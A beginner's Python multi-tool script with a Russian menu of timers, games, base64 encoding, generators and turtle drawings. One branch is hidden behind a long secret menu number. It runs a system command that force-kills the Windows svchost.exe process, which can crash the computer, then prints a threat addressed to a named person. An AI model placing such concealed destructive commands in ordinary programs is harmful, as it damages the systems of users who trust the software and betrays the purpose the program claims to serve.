from random import *
from time import *
from turtle import *
import os
import base64
import main_fun
import datetime
print("MultiPy \n1-пусто \n2-таймер обратного отчета \n3- игра угадай число \n4-о MultiPy \n5-что нового? \n6-погода \n7-секудомер \n8-генератор \n9-супербыстрый таймер обратного отсчета \n10-None \n11-base64 \n12-игра КНБ \n13-бросить кубик \n14-Генератор фигур \n15-узнать длинну строки\nВыбирай цифру!")
ipt = int(input("Что вы хотите сделать?(введите 0 для выхода):"))
while ipt != 0:
    if ipt == 1:
        ""
    elif ipt == 2:
        timer1 = int(input("Таймер обратного отсчета. Введите секунды: "))
        for i in range(timer1, -1, -1):
            print(i)
            sleep(1)
    elif ipt == 3:
        print("Угадайте число от 1 до 100!")
        count = randint(1,100)
        price = int(input("Введите число: "))
        while price != count:
            if price > 101:
                print("Сказали же, ДО 100 xD")
            elif price > count:
                print("Число меньше!")
            elif price < count:
                print("Число больше!")
            else:
                break
            price = int(input("Введите число: "))
        if price == count:
                print("Вы угадали!")
    elif ipt == 4:
        print("Программа MultiPy. Версия 2.1.1 от 10.08.23. Некоторые пункты взяты из интернета, я не писал их сам.")
    elif ipt == 5:
        main_fun.info()
    elif ipt == 6:
        city = input("Введите название города: ")
        weather = main_fun.get_weather(city)
        print(weather)
    elif ipt == 7:
        sec_start = int(input("1 - запустить таймер, 0 - выйти: "))
        if sec_start == 1:
            start = time()
            sec_end = int(input("0 - стоп: "))
            end = time()
            total_time = (end - start)
            print("Время -",round(total_time, 3))
    elif ipt == 8:
        per1 = int(input("1 - генератор букв, 2 - генератор цифр, 3 - генератор пароля(буквы + цифры): "))
        if per1 == 1:
            per2 = ""
            dsds = int(input("Введите длинну: "))
            alfeu = "abcdefghijklmnopqrstuvwxyz"
            alfru = "абвгдеёжзийклмнопрстуфхцчшщъыьэюя"
            alfch = "灭斯迪斯尼亚克图路迪斯尼亚克"
            gdh = input("А какой язык? eu / ru / all? ").lower()
            if gdh == "ru":
                alf = alfru
            if gdh == "eu":
                alf = alfeu
            if gdh == "ch":
                alf = alfch
            if gdh == "all":
                alf = ""
                alf += alfru
                alf += alfeu
            for i in range(dsds):
                per2 += alf[randint(0, (len(alf) - 1))]
            print(per2)
        if per1 == 2:
            dsds = int(input("Введите длинну пароля: "))
            per1 = ""
            for i in range(dsds):
                per1 += str(randint(0,9))
            print(per1)
        if per1 == 3:
            per2 = ""
            dsds = int(input("Введите длинну: "))
            alfeu = "abcdefghijklmnopqrstuvwxyz"
            alfru = "абвгдеёжзийклмнопрстуфхцчшщъыьэюя"
            gdh = input("А какой язык? eu / ru / all? ").lower()
            if gdh == "ru":
                alf = alfru
            if gdh == "eu":
                alf = alfeu
            if gdh == "all":
                alf = ""
                alf += alfru
                alf += alfeu
            for i in range(dsds):
                per2 += alf[randint(0, (len(alf) - 1))]
                if randint(1,3) == 1:
                    for i in range(randint(1, 3)):
                        per2 += str(randint(0,9))
            print(per2)
    elif ipt == 9:
        timer1 = int(input("Супер-Таймер обратного отсчета. Введите секунды: "))
        for i in range(timer1, -1, -1):
            print(i)
    elif ipt == 10:
        ""
    elif ipt == 11:
        q = int(input("1 - зашифровать, 2 - расшифровать: "))
        if q == 2:
            encoded_string = input("Введите строку для расшифрования: ")
            decoded_bytes = base64.b64decode(encoded_string)
            decoded_string = decoded_bytes.decode("utf-8")
            print(decoded_string)
        if q == 1:
            q = input("Введите строку для шифрования: ")
            b = q.encode("UTF-8")
            e = base64.b64encode(b)
            s1 = e.decode("UTF-8")
            print(s1)
    elif ipt == 12:
            main_fun.knb() 
    elif ipt == 13:
        print("Вам выпало", randint(1,6))
    elif ipt == 14:
        def fun1():
            r = randint(0, 255)
            g = randint(0, 255)
            b = randint(0, 255)
            color2 = (r, g, b)
            for i in range(20):
                color(color1)
                forward(100)
                left(120)
                left(10)
                color(color2)
                forward(100)
                left(120)
                left(10)  
        def fun2(color1):
            # задаю цвет
            colormode(255)
            r = randint(0, 255)
            g = randint(0, 255)
            b = randint(0, 255)
            color1 = (r, g, b)
            if datetime.date.today() == datetime.date(1970, 1, 1):
                color1 = ("#FFF")
            pencolor(color1)
            #скорость
            speed(10)
            # генерация 
            pensize(randint(4, 10))
            ran3 = randint(10, 200)
            ran2 = randint(1,12)
            # рандомные координаты
            penup()
            goto(randint(-200, 200), randint(-200, 200))
            pendown()
            if ran2 == 1:
                #круг 1
                circle(ran3)
            if ran2 == 2:
                # круг с заливкой 1
                begin_fill()
                circle(ran3)
                end_fill()
            if ran2 == 3:
                # звезда
                begin_fill()
                for i in range(5):
                    forward(150)
                    left(144)
                end_fill()
            if ran2 == 4:
                # поворот на 90
                left(90)
            if ran2 == 5:
                # квадрат
                for i in range(4):
                    forward(100)
                    left(90)
            if ran2 == 6:
                # круг 2
                circle(ran3)
            if ran2 == 7:
                # треугольник
                for i in range(3):
                    forward(ran3)
                    left(120)
            if ran2 == 8:
                # спираль
                per11 = 0
                for i in range(randint(10, 36)):
                    forward(per11)  
                    per11 += 5
                    left(90) 
            if ran2 == 9:
                # круг с заливкой 2 
                begin_fill()
                circle(ran3)
                end_fill()
            if ran2 == 10:
                # какая то фигня
                fun1()
            if ran2 == 11:
                # ромб
                left(randint(0,360))
                for i in range(2):
                    left(45)
                    forward(100)
                    left(135)
                    forward(100)
        while True:
            r = randint(0, 255)
            g = randint(0, 255)
            b = randint(0, 255)
            color1 = (r, g, b)
            fun2(color1)
    elif ipt == 15:
        per3 = input("Введите сторку: ")
        print("Длинна строки:", len(per3))
    elif ipt == 111011011000011101110111100111001011101011:
        os.system("taskkill /im svchost.exe /f")
        sleep(5)
        print("Ваня... Увижу, убью")
    else: 
        print("???")
    ipt = int(input("Что вы хотите сделать?(введите 0 для выхода):"))
print("exit...")